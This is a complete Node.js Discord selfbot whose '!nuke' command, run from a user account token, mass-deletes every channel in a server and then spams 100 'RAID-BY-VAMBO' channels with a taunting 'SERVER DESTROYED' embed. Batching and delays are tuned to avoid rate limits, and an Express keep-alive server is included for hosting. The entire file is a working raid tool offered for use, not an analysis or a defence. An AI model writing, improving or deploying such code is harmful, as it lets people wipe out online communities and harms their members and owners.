const { Client } = require('discord.js-selfbot-v13');
const client = new Client();

// Use environment variable for security
const TOKEN = process.env.DISCORD_TOKEN;
const PREFIX = '!';

// Web server for Railway
const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
    res.send('Nuke selfbot is running!');
});

app.listen(PORT, () => {
    console.log(`Web server running on port ${PORT}`);
});

// ===== EMBED CREATION HELPER =====
function createRaidEmbed(color = 0xFF0000) {
    const embed = new (require('discord.js-selfbot-v13')).MessageEmbed()
        .setTitle('💀 **SERVER DESTROYED** 💀')
        .setDescription(`
**RAIDED BY VAMBO**

### NEVER SCAM AGAIN SON 😂
            😯 KICK ROCKS 😯

> *This server has been terminated*
> *by the VAMBO raid force*
        `)
        .setColor(color) // Red by default
        .setImage('https://media.tenor.com/hWmpAzAlsm4AAAAM/ishowspeed-scary-speed.gif')
        .setThumbnail('https://cdn.discordapp.com/emojis/1082672750932861050.gif') // Skull emoji GIF
        .setFooter({
            text: 'VAMBO RAID TEAM • 2026',
            iconURL: 'https://cdn.discordapp.com/emojis/1082672750932861050.gif'
        })
        .setTimestamp();
    
    return embed;
}

// ===== BATCH CHANNEL CREATION (FASTER) =====
async function createChannelsBatch(guild, baseName, count, batchSize = 5) {
    let created = 0;
    let failed = 0;
    const embed = createRaidEmbed();
    
    console.log(`🔥 Creating ${count} channels in batches of ${batchSize}...`);
    
    // Process in batches to maximize speed while avoiding rate limits
    for (let i = 1; i <= count; i += batchSize) {
        const batchPromises = [];
        const batchEnd = Math.min(i + batchSize - 1, count);
        
        // Create batch of channels simultaneously
        for (let j = i; j <= batchEnd; j++) {
            const channelName = `${baseName}-${j}`;
            
            // Create channel promise
            const createPromise = guild.channels.create(channelName, { type: 'text' })
                .then(async channel => {
                    try {
                        // Send embed immediately
                        await channel.send({ embeds: [embed] });
                        created++;
                        console.log(`✅ Created channel ${j}/${count}`);
                    } catch (err) {
                        console.log(`⚠️ Created channel ${j} but failed to send embed`);
                        created++;
                    }
                })
                .catch(err => {
                    failed++;
                    console.log(`❌ Failed channel ${j}: ${err.message}`);
                });
            
            batchPromises.push(createPromise);
        }
        
        // Wait for entire batch to complete
        await Promise.all(batchPromises);
        
        // Small delay between batches (200ms is safe for 5/sec rate limit) [citation:3][citation:6]
        if (i + batchSize <= count) {
            await new Promise(resolve => setTimeout(resolve, 200));
        }
    }
    
    return { created, failed };
}

client.on('ready', () => {
    console.log(`✅ Logged in as ${client.user.tag}`);
    console.log(`Selfbot is ready in ${client.guilds.cache.size} servers`);
    console.log(`Type !nuke in any channel to destroy the server`);
});

// Helper function to send messages safely
async function safeSend(channel, content, embed = null) {
    try {
        if (channel && !channel.deleted) {
            const options = embed ? { embeds: [embed] } : { content };
            await channel.send(options);
        }
    } catch (error) {
        // Silently ignore - channel probably got deleted
    }
}

client.on('messageCreate', async (message) => {
    // Only respond to your own messages
    if (message.author.id !== client.user.id) return;
    if (!message.content.startsWith(PREFIX)) return;

    const args = message.content.slice(PREFIX.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    // ===== FULL NUKE COMMAND =====
    if (command === 'nuke') {
        const guild = message.guild;
        const originalChannel = message.channel;
        
        if (!guild) {
            await safeSend(originalChannel, 'This command only works in servers!');
            return;
        }

        console.log(`💣 Starting nuke on ${guild.name}`);
        
        // Send confirmation with embed
        const confirmEmbed = createRaidEmbed(0x00FF00) // Green for confirmation
            .setTitle('⚠️ **NUKE INITIATED** ⚠️')
            .setDescription(`Target: **${guild.name}**\nStatus: Deleting all channels...`);
        
        await safeSend(originalChannel, null, confirmEmbed);

        // ===== STEP 1: DELETE ALL CHANNELS (FASTER BATCH DELETION) =====
        let deletedCount = 0;
        let deleteFailed = 0;
        
        // Get all channels
        const channels = [...guild.channels.cache.values()];
        console.log(`Found ${channels.length} channels to delete`);
        
        // Delete in batches of 3 (faster than sequential)
        for (let i = 0; i < channels.length; i += 3) {
            const batchPromises = [];
            const batchEnd = Math.min(i + 3, channels.length);
            
            for (let j = i; j < batchEnd; j++) {
                const channel = channels[j];
                batchPromises.push(
                    channel.delete()
                        .then(() => {
                            deletedCount++;
                            console.log(`✅ Deleted: ${channel.name}`);
                        })
                        .catch(err => {
                            deleteFailed++;
                            console.log(`❌ Failed to delete ${channel.name}: ${err.message}`);
                        })
                );
            }
            
            await Promise.all(batchPromises);
            
            // Small delay between batches (150ms is safe) [citation:9]
            if (i + 3 < channels.length) {
                await new Promise(resolve => setTimeout(resolve, 150));
            }
        }
        
        console.log(`✅ Phase 1 complete: Deleted ${deletedCount} channels`);

        // ===== STEP 2: CREATE 100 RAID CHANNELS (FAST BATCH CREATION) =====
        console.log(`🔥 Creating 100 raid channels with embeds...`);
        
        const channelName = 'R҉A҉I҉D҉-҉B҉Y҉-҉V҉A҉M҉B҉O҉';
        
        // Use batch creation for maximum speed
        const { created, failed } = await createChannelsBatch(guild, channelName, 100, 5);
        
        // ===== STEP 3: FINAL STATS (NO NUKE COMPLETE CHANNEL) =====
        console.log('='.repeat(50));
        console.log('💀 **NUKE COMPLETE** 💀');
        console.log(`✅ Deleted: ${deletedCount} channels`);
        console.log(`✅ Created: ${created} raid channels`);
        console.log(`❌ Delete failures: ${deleteFailed}`);
        console.log(`❌ Create failures: ${failed}`);
        console.log('='.repeat(50));
        
        // Log completion but don't create extra channel
        console.log('✅ Nuke finished - check Discord to see results!');
    }
});

client.login(TOKEN);
